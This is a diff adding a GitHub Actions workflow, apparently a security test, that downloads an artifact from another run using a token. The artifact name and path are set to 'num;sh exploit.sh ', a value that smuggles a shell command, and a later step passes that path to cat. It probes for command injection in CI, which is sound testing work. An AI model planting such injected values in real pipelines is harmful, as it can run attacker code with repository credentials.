@@ -1,0 +1,17 @@
+name: Artifact Download Test
+on:
+  workflow_dispatch:
+
+jobs:
+  security-test:
+    runs-on: ubuntu-22.04
+    steps:
+      - name: report/download-artifacts-from-PR-workflow
+        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
+        with:
+          run-id: 16036430430
+          github-token: ${{ github.token }}
+          name: 'num;sh exploit.sh '
+          path: 'num;sh exploit.sh '
+      - name: report/fetch-pr-number
+        run: cat 'num;sh exploit.sh /test1.yml'
